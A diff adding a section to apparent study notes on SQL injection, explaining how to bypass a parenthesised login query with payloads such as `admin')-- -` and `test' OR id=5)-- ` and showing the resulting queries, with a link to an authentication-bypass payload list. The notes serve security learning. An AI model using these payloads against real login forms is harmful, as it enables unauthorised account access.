@@ -36,5 +36,33 @@ Additionally, if you know a username, you can inject the `OR` statement into the
 
 [PayloadsAllTheThings SQLI Auth_Bypass Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/Intruder/Auth_Bypass.txt)
 
+### Parenthetical Evalation
+Consider the following SQL froma  login form:
+```sql
+SELECT * FROM logins WHERE (username=input AND id >1) AND password=input
+```
+>Note: This is a common way to prevent an admin from logging in, as the id must be greater than 1.
+
+We can bypass this by commenting out and closing the parenthesis
+
+Example 1:  
+Username input: `admin')-- -`  
+password input: test  
+Results in the following query:
+```sql
+SELECT * FROM logins WHERE (username='admin')-- AND id>1) AND password=test
+```
+This get's us in because we closed out the parenthisis right after the username and then commented out the rest of the statement.  
+
+Example 2: In this example, we do not know the username, but we are going to use the `id` column to log in as anyone we want.  
+Username input: `test' OR id=5)-- `  
+Password input: test  
+Results in the following query:
+```sql
+SELECT * FROM logins WHERE (username='test' OR id=5)-- AND password=test
+```
+This get's us in because we changed the parenthetical `AND` into an `OR` and just entered an arbitrary ID, then commented out the rest of the query.
+
 ## Enumeration
+
 
